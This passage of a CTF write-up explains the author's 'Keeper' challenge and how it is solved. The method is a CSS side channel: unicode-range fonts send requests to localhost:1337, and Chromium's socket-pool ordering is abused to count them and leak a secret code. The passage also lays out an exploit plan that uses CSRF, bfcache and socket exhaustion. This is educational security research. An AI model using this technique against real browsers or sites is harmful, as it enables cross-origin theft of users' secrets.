</span></span><span class=line><span class=cl>    <span class=nt>src</span><span class=o>:</span> <span class=nt>url</span><span class=o>(</span><span class=nt>http</span><span class=o>://</span><span class=nt>localhost</span><span class=p>:</span><span class=nd>1337</span><span class=o>/</span><span class=nt>1118104637</span><span class=p>.</span><span class=nc>something</span><span class=o>?</span><span class=nt>random</span><span class=o>=</span><span class=nt>3714835915</span><span class=o>),</span><span class=nt>url</span><span class=o>(</span><span class=nt>http</span><span class=o>://</span><span class=nt>localhost</span><span class=p>:</span><span class=nd>1337</span><span class=o>/</span><span class=nt>2235380074</span><span class=p>.</span><span class=nc>something</span><span class=o>?</span><span class=nt>random</span><span class=o>=</span><span class=nt>670921881</span><span class=o>),</span><span class=nt>url</span><span class=o>(</span><span class=nt>http</span><span class=o>://</span><span class=nt>localhost</span><span class=p>:</span><span class=nd>1337</span><span class=o>/</span><span class=nt>3179595971</span><span class=p>.</span><span class=nc>something</span><span class=o>?</span><span class=nt>random</span><span class=o>=</span><span class=nt>1661173205</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=nt>unicode-range</span><span class=p>:</span><span class=nd>U</span><span class=o>+</span><span class=nt>0041</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>@</span><span class=k>font-face</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>font-family</span><span class=p>:</span><span class=nd>has_B</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=nt>src</span><span class=o>:</span> <span class=nt>url</span><span class=o>(</span><span class=nt>http</span><span class=o>://</span><span class=nt>localhost</span><span class=p>:</span><span class=nd>1337</span><span class=o>/</span><span class=nt>2357283186</span><span class=p>.</span><span class=nc>something</span><span class=o>?</span><span class=nt>random</span><span class=o>=</span><span class=nt>3305567327</span><span class=o>),</span><span class=nt>url</span><span class=o>(</span><span class=nt>http</span><span class=o>://</span><span class=nt>localhost</span><span class=p>:</span><span class=nd>1337</span><span class=o>/</span><span class=nt>605747667</span><span class=p>.</span><span class=nc>something</span><span class=o>?</span><span class=nt>random</span><span class=o>=</span><span class=nt>1840745527</span><span class=o>),</span><span class=nt>url</span><span class=o>(</span><span class=nt>http</span><span class=o>://</span><span class=nt>localhost</span><span class=p>:</span><span class=nd>1337</span><span class=o>/</span><span class=nt>865462447</span><span class=p>.</span><span class=nc>something</span><span class=o>?</span><span class=nt>random</span><span class=o>=</span><span class=nt>1135644699</span><span class=o>),</span><span class=nt>url</span><span class=o>(</span><span class=nt>http</span><span class=o>://</span><span class=nt>localhost</span><span class=p>:</span><span class=nd>1337</span><span class=o>/</span><span class=nt>2122681983</span><span class=p>.</span><span class=nc>something</span><span class=o>?</span><span class=nt>random</span><span class=o>=</span><span class=nt>1228559196</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=nt>unicode-range</span><span class=p>:</span><span class=nd>U</span><span class=o>+</span><span class=nt>0042</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span></code></pre></div><p>An animation loop is used to try every character:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-css data-lang=css><span class=line><span class=cl><span class=p>@</span><span class=k>keyframes</span> <span class=nt>trychar_0</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>0</span><span class=p>.</span><span class=nc>0</span><span class=o>%</span> <span class=p>{</span> <span class=k>font-family</span><span class=p>:</span> <span class=k>rest</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nt>5</span><span class=p>.</span><span class=nc>0</span><span class=o>%</span> <span class=p>{</span> <span class=k>font-family</span><span class=p>:</span> <span class=n>has_A</span><span class=p>,</span> <span class=k>rest</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nt>6</span><span class=p>.</span><span class=nc>25</span><span class=o>%</span> <span class=p>{</span> <span class=k>font-family</span><span class=p>:</span> <span class=k>rest</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nt>11</span><span class=p>.</span><span class=nc>25</span><span class=o>%</span> <span class=p>{</span> <span class=k>font-family</span><span class=p>:</span> <span class=n>has_B</span><span class=p>,</span> <span class=k>rest</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nt>12</span><span class=p>.</span><span class=nc>5</span><span class=o>%</span> <span class=p>{</span> <span class=k>font-family</span><span class=p>:</span> <span class=k>rest</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=o>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Assuming the code to leak is <code>B0B1B0</code>, and given that there are six elements with the code-digit class, I can use the <a href=https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-child><code>:nth-child</code> pseudo-class</a> to target the first element (so the first input, containing the first character of the code) and apply the following CSS:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-css data-lang=css><span class=line><span class=cl><span class=p>.</span><span class=nc>code-digit</span><span class=p>:</span><span class=nd>nth-child</span><span class=o>(</span><span class=nt>1</span><span class=o>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>animation</span><span class=p>:</span> <span class=n>trychar_0</span> <span class=kc>step-end</span> <span class=mi>2</span><span class=kt>s</span> <span class=mi>0</span><span class=kt>s</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>animation-iteration-count</span><span class=p>:</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>animation-delay</span><span class=p>:</span> <span class=mi>4</span><span class=kt>s</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Now, in the <code>Network</code> tab of DevTools, you should now see 4 requests since the first character of the code is B, which was mapped to 4 requests. With the characters distinguishable from each other, it&rsquo;s now possible to count how many requests are sent by abusing the connection pool.</p><h3 id=deep-diving-into-chromium-internals><a class=full-clickable-heading href=#deep-diving-into-chromium-internals>Deep Diving into Chromium Internals</a></h3><p>In order to understand the exploit, it&rsquo;s important to clarify some important concepts.</p><h4 id=stalled-requests-priorities--more><a class=full-clickable-heading href=#stalled-requests-priorities--more>Stalled requests, priorities & more</a></h4><p>A request is considered &ldquo;stalled&rdquo; when both of these conditions are met<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>:</p><ul><li>The socket pool has already handed out (or is in the process of connecting) as many sockets as allowed, that is, the total number of sockets in use is at least the global maximum.</li><li>Despite the global limit being reached, there is at least one group with pending requests that has not yet hit its per-group socket limit. In other words, if a group could accept another socket (because it hasn‚Äôt reached its group limit), but the pool overall is full, then a request waiting in that group is stalled due to the global socket exhaustion.</li></ul><p>It&rsquo;s known that when a socket is freed, the request with the highest priority is processed first. However, if two stalled requests have the same priority, it&rsquo;s unclear which one gets served next.</p><p>Since I couldn‚Äôt find any online documentation about this, I had to look directly at the Chromium source code (HUGE thanks to @simonedimaria) to see which functions decide the order of stalled requests:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=c1>// Search for the highest priority pending request, amongst the groups that
</span></span></span><span class=line><span class=cl><span class=c1>// are not at the |max_sockets_per_group_| limit. Note: for requests with
</span></span></span><span class=line><span class=cl><span class=c1>// the same priority, the winner is based on group hash ordering (and not
</span></span></span><span class=line><span class=cl><span class=c1>// insertion order).
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>bool</span> <span class=n>TransportClientSocketPool</span><span class=o>::</span><span class=n>FindTopStalledGroup</span><span class=p>(</span><span class=n>Group</span><span class=o>**</span> <span class=n>group</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                                    <span class=n>GroupId</span><span class=o>*</span> <span class=n>group_id</span><span class=p>)</span> <span class=k>const</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>CHECK</span><span class=p>(</span><span class=n>group</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>CHECK</span><span class=p>(</span><span class=n>group_id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>Group</span><span class=o>*</span> <span class=n>top_group</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>const</span> <span class=n>GroupId</span><span class=o>*</span> <span class=n>top_group_id</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>bool</span> <span class=n>has_stalled_group</span> <span class=o>=</span> <span class=nb>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=k>const</span> <span class=k>auto</span><span class=o>&amp;</span> <span class=nl>it</span> <span class=p>:</span> <span class=n>group_map_</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Group</span><span class=o>*</span> <span class=n>curr_group</span> <span class=o>=</span> <span class=n>it</span><span class=p>.</span><span class=n>second</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>curr_group</span><span class=o>-&gt;</span><span class=n>has_unbound_requests</span><span class=p>())</span>
</span></span><span class=line><span class=cl>      <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>curr_group</span><span class=o>-&gt;</span><span class=n>CanUseAdditionalSocketSlot</span><span class=p>(</span><span class=n>max_sockets_per_group_</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>has_stalled_group</span> <span class=o>=</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=kt>bool</span> <span class=n>has_higher_priority</span> <span class=o>=</span>
</span></span><span class=line><span class=cl>          <span class=o>!</span><span class=n>top_group</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>          <span class=n>curr_group</span><span class=o>-&gt;</span><span class=n>TopPendingPriority</span><span class=p>()</span> <span class=o>&gt;</span> <span class=n>top_group</span><span class=o>-&gt;</span><span class=n>TopPendingPriority</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>has_higher_priority</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>top_group</span> <span class=o>=</span> <span class=n>curr_group</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>top_group_id</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>it</span><span class=p>.</span><span class=n>first</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>top_group</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>group</span> <span class=o>=</span> <span class=n>top_group</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>group_id</span> <span class=o>=</span> <span class=o>*</span><span class=n>top_group_id</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>CHECK</span><span class=p>(</span><span class=o>!</span><span class=n>has_stalled_group</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>has_stalled_group</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=n>TransportClientSocketPool</span><span class=o>::</span><span class=n>CheckForStalledSocketGroups</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Loop until there&#39;s nothing more to do.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>while</span> <span class=p>(</span><span class=nb>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// If we have idle sockets, see if we can give one to the top-stalled group.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>Group</span><span class=o>*</span> <span class=n>top_group</span> <span class=o>=</span> <span class=k>nullptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>GroupId</span> <span class=n>top_group_id</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>FindTopStalledGroup</span><span class=p>(</span><span class=o>&amp;</span><span class=n>top_group</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>top_group_id</span><span class=p>))</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>ReachedMaxSocketsLimit</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>idle_socket_count_</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>CloseOneIdleSocket</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// We can&#39;t activate more sockets since we&#39;re already at our global
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// limit.
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Note that this may delete top_group.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>OnAvailableSocketSlot</span><span class=p>(</span><span class=n>top_group_id</span><span class=p>,</span> <span class=n>top_group</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Note that <code>group_map_</code> is a <code>GroupMap</code><sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup>, defined as:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=k>using</span> <span class=n>GroupMap</span> <span class=o>=</span> <span class=n>std</span><span class=o>::</span><span class=n>map</span><span class=o>&lt;</span><span class=n>GroupId</span><span class=p>,</span> <span class=n>raw_ptr</span><span class=o>&lt;</span><span class=n>Group</span><span class=p>,</span> <span class=n>CtnExperimental</span><span class=o>&gt;&gt;</span><span class=p>;</span>
</span></span></code></pre></div><p>This means that when two groups have the same pending priority, the code never updates the current top group. In other words, the group that was already stored as <code>top_group</code> wins. Also, the order in <code>group_map_</code> isn‚Äôt random, it follows the hash order of the <code>GroupId</code>. So even if priorities are equal, the winner is determined by that underlying order.</p><p>While <code>GroupId</code> is defined as:<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>  <span class=k>class</span> <span class=nc>NET_EXPORT</span> <span class=n>GroupId</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Returns the prefix for `privacy_mode` for logging.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>static</span> <span class=n>std</span><span class=o>::</span><span class=n>string_view</span> <span class=n>GetPrivacyModeGroupIdPrefix</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>PrivacyMode</span> <span class=n>privacy_mode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Returns the prefix for `secure_dns_policy` for logging.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>static</span> <span class=n>std</span><span class=o>::</span><span class=n>string_view</span> <span class=n>GetSecureDnsPolicyGroupIdPrefix</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>SecureDnsPolicy</span> <span class=n>secure_dns_policy</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>GroupId</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>GroupId</span><span class=p>(</span><span class=n>url</span><span class=o>::</span><span class=n>SchemeHostPort</span> <span class=n>destination</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>PrivacyMode</span> <span class=n>privacy_mode</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>NetworkAnonymizationKey</span> <span class=n>network_anonymization_key</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>SecureDnsPolicy</span> <span class=n>secure_dns_policy</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=kt>bool</span> <span class=n>disable_cert_network_fetches</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>Finally, <code>url::SchemeHostPort</code> is defined as:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=k>class</span> <span class=nf>COMPONENT_EXPORT</span><span class=p>(</span><span class=n>URL</span><span class=p>)</span> <span class=n>SchemeHostPort</span> <span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl> <span class=p>...</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=k>private</span><span class=o>:</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Note: `port_` is declared first to control the sort order.
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>uint16_t</span> <span class=n>port_</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>scheme_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>host_</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>Now, let&rsquo;s go back to <code>GroupId</code> to see how the hash ordering is done<sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>...</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=kt>bool</span> <span class=k>operator</span><span class=o>==</span><span class=p>(</span><span class=k>const</span> <span class=n>GroupId</span><span class=o>&amp;</span> <span class=n>other</span><span class=p>)</span> <span class=k>const</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=n>std</span><span class=o>::</span><span class=n>tie</span><span class=p>(</span><span class=n>destination_</span><span class=p>,</span> <span class=n>privacy_mode_</span><span class=p>,</span> <span class=n>network_anonymization_key_</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                      <span class=n>secure_dns_policy_</span><span class=p>,</span> <span class=n>disable_cert_network_fetches_</span><span class=p>)</span> <span class=o>==</span>
</span></span><span class=line><span class=cl>             <span class=n>std</span><span class=o>::</span><span class=n>tie</span><span class=p>(</span><span class=n>other</span><span class=p>.</span><span class=n>destination_</span><span class=p>,</span> <span class=n>other</span><span class=p>.</span><span class=n>privacy_mode_</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                      <span class=n>other</span><span class=p>.</span><span class=n>network_anonymization_key_</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                      <span class=n>other</span><span class=p>.</span><span class=n>secure_dns_policy_</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                      <span class=n>other</span><span class=p>.</span><span class=n>disable_cert_network_fetches_</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>bool</span> <span class=k>operator</span><span class=o>&lt;</span><span class=p>(</span><span class=k>const</span> <span class=n>GroupId</span><span class=o>&amp;</span> <span class=n>other</span><span class=p>)</span> <span class=k>const</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=n>std</span><span class=o>::</span><span class=n>tie</span><span class=p>(</span><span class=n>destination_</span><span class=p>,</span> <span class=n>privacy_mode_</span><span class=p>,</span> <span class=n>network_anonymization_key_</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                      <span class=n>secure_dns_policy_</span><span class=p>,</span> <span class=n>disable_cert_network_fetches_</span><span class=p>)</span> <span class=o>&lt;</span>
</span></span><span class=line><span class=cl>             <span class=n>std</span><span class=o>::</span><span class=n>tie</span><span class=p>(</span><span class=n>other</span><span class=p>.</span><span class=n>destination_</span><span class=p>,</span> <span class=n>other</span><span class=p>.</span><span class=n>privacy_mode_</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                      <span class=n>other</span><span class=p>.</span><span class=n>network_anonymization_key_</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                      <span class=n>other</span><span class=p>.</span><span class=n>secure_dns_policy_</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                      <span class=n>other</span><span class=p>.</span><span class=n>disable_cert_network_fetches_</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>Since <code>std::map</code> uses the &lt; operator to order its keys<sup id=fnref:7><a href=#fn:7 class=footnote-ref role=doc-noteref>7</a></sup>, <code>group_map_</code> ends up being sorted according to that tuple. So, the keys are arranged sequentially by <code>{port, scheme, host}</code> (among other factors, which I&rsquo;m ignoring here).</p><p>Consider two examples illustrating the ordering:</p><p><strong>Example 1</strong>:</p><ul><li><code>request1</code>:<ul><li>port: 80</li><li>scheme: http</li><li>host: <code>aaaaaa.sleep.example.com</code></li></ul></li><li><code>request2</code>:<ul><li>port: 80</li><li>scheme: http</li><li>host: <code>zzzzzz.sleep.example.com</code></li></ul></li></ul><p>Since both requests &ldquo;share&rdquo; the same port and scheme, the decision is based on the host. Here, <code>aaaaaa.sleep.example.com</code> comes before <code>zzzzzz.sleep.example.com</code> because the first character <code>a</code> is less than <code>z</code> in alphabetical order. Therefore, <code>request1</code> is processed first.</p><p><strong>Example 2</strong>:</p><ul><li><code>request1</code>:<ul><li>port: 1337</li><li>scheme: http</li><li>host: <code>aaaaa.sleep.example.com</code></li></ul></li><li><code>request2</code>:<ul><li>port: 80</li><li>scheme: http</li><li>host: <code>zzzzz.sleep.example.com</code></li></ul></li></ul><p>In this case, even though the scheme is the same for both, the port numbers differ. Since <code>80</code> (from <code>request2</code>) is less than <code>1337</code> (from <code>request1</code>), <code>request2</code> will be processed first.</p><p>Okay! Let the games begin!</p><h3 id=abusing-groupid-hash-ordering><a class=full-clickable-heading href=#abusing-groupid-hash-ordering>Abusing GroupId hash ordering</a></h3><p>Here&rsquo;s the solution I came up with:</p><ol><li>Block 255 sockets by sending requests to 255 different origins (eg. <code>&lt;i>.sleep.example.com</code>) that will respond after a long delay (+70 seconds)</li><li>Block the last available socket using the same method as above and keep its controller</li><li>send a fetch request to <code>zzzzzz.sleep.example.com</code></li><li>Wait until the first font request is initiated (in my exploit I wait 4 seconds to do so)</li><li>Use the stored controller to abort the request from step <code>2</code> using <code>controller.abort()</code></li><li>Immediately begin sending fetch requests one after another to <code>aaaaaa.sleep.example.com</code>. Make sure these requests are sent sequentially! (Only after the previous one has loaded)</li></ol><p>Now, if everything is done correctly, this is what is going to happen:</p><ol start=7><li>When the final socket becomes available, the request with the highest priority (so the font request<sup id=fnref:8><a href=#fn:8 class=footnote-ref role=doc-noteref>8</a></sup>) will be processed first.</li><li>Next, the freed socket is assigned to the pending fetch request from step <code>6</code>. Even though there are two pending requests, the one targeting <code>aaaaaa.sleep.example.com</code> is chosen first because its host is alphabetically lower than <code>zzzzzz.sleep.example.com</code> (as determined by <code>TransportClientSocketPool::CheckForStalledSocketGroups</code>)</li><li>Once that request is completed, another font request is triggered, and the loop repeats until all font requests have been handled.</li><li>After the loop ends, the last fetch request from <code>6</code> is processed. At this point, since only two requests remain, the fetch request from step <code>6</code> gets priority, allowing the fetch from step <code>3</code> to complete!</li><li>Finally, count the number of fetch requests from step <code>6</code> that were processed. This count corresponds to the number of font requests made via CSS, which corresponds to the letter assigned to that number of requests! For example, if 4 fetch requests are processed, the leaked letter is <code>B</code></li></ol><p><img src=/images/sockets-res.gif alt="alt text"></p><p>Now the last thing to do is putting everything together!</p><h2 id=putting-it-all-together><a class=full-clickable-heading href=#putting-it-all-together>Putting it all together</a></h2><p><code>server1: zzzz${i}.server.com</code><br><code>server2: aaaa${i}.server.com</code></p><p>Here&rsquo;s what the exploit is going to do:</p><ul><li>Generate the CSS payload as described earlier</li><li>Open a popup to perform CSRF and set an arbitrary secret with the CSS payload</li><li>Open another popup</li><li>Use <code>window.history.go(-2)</code> to navigate back to the page with the bot code<ul><li>The CSRF will modify the <code>session</code> cookie but the bot code will still remain in the bfcache</li></ul></li><li>In the previously opened popup:<ul><li>Create a hashmap (eg. 3 -> A, 4 -> B, 5 -> C, &mldr;)</li><li>Fill 255 sockets</li><li>Repeat the following for each character in the code:<ul><li>Fill the 256th socket and Keep its controller</li><li>Send a fetch requests to <code>server1</code></li><li>Wait until the font requests are triggered</li><li>Release the 256th socket</li><li>Immediately start sending fetch requests to <code>server2</code> in a loop</li><li>Exit from that loop when a request to <code>server1</code> completes</li><li>The number of requests sent to <code>server2</code> corresponds to a certain character</li></ul></li></ul></li><li>Profit</li></ul><style type=text/css>.notice{--title-color:#fff;--title-background-color:#6be;--content-color:#444;--content-background-color:#e7f2fa}.notice.info{--title-background-color:#fb7;--content-background-color:#fec}.notice.tip{--title-background-color:#5a5;--content-background-color:#efe}.notice.warning{--title-background-color:#c33;--content-background-color:#fee}@media(prefers-color-scheme:dark){.notice{--title-color:#fff;--title-background-color:#069;--content-color:#ddd;--content-background-color:#023}.notice.info{--title-background-color:#a50;--content-background-color:#420}.notice.tip{--title-background-color:#363;--content-background-color:#121}.notice.warning{--title-background-color:#800;--content-background-color:#400}}body.dark .notice{--title-color:#fff;--title-background-color:#069;--content-color:#ddd;--content-background-color:#023}body.dark .notice.info{--title-background-color:#a50;--content-background-color:#420}body.dark .notice.tip{--title-background-color:#363;--content-background-color:#121}body.dark .notice.warning{--title-background-color:#800;--content-background-color:#400}.notice{--title-color:#fff;--title-background-color:#bd31bd;--content-color:#ddd;--content-background-color:#5d0269}.notice.info{--title-background-color:#a50;--content-background-color:#420}.notice.tip{--title-background-color:#363;--content-background-color:#121}.notice.warning{--title-background-color:#800;--content-background-color:#400}.notice{padding:18px;line-height:24px;margin-bottom:24px;border-radius:4px;color:var(--content-color);background:var(--content-background-color)}.notice p:last-child{margin-bottom:0}.notice-title{margin:-18px -18px 12px;padding:4px 18px;border-radius:4px 4px 0 0;font-weight:700;color:var(--title-color);background:var(--title-background-color)}.icon-notice{display:inline-flex;align-self:center;margin-right:8px}.icon-notice img,.icon-notice svg{height:1em;width:1em;fill:currentColor}.icon-notice img,.icon-notice.baseline svg{top:.125em;position:relative}</style><div class="notice note"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="0 128 300 300"><path d="M150 128c82.813.0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812.0 278c0-82.813 67.188-150 150-150zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515.0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32.0 6.055-2.93 6.055-6.445zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758.0-3.516.586-4.688 1.563-1.367.78-1.953 2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515.0 6.445-2.148 6.64-4.883z"/></svg>
</span>Note</p><p>Ensure that each character is assigned enough requests. I noticed that the lowest character should be allocated at least three requests in order to be leaked successfully.</p></div><h3 id=poc><a class=full-clickable-heading href=#poc>PoC</a></h3><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/f2tZomaJ3XQ?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><p>You can download the exploit from <a href=https://github.com/salvatore-abello/web-challenges/tree/main/TRX%20CTF%202025/Keeper/exploit>here</a></p><h3 id=limitations><a class=full-clickable-heading href=#limitations>Limitations</a></h3><p>Works only on Chromium-based browsers.</p><h2 id=conclusion><a class=full-clickable-heading href=#conclusion>Conclusion</a></h2><p>I had a great time creating and solving this challenge! Unfortunately, out of the three solvers, only one solved it as intended. :/</p><p>The exploit could be much faster than it currently is. I also want to thank 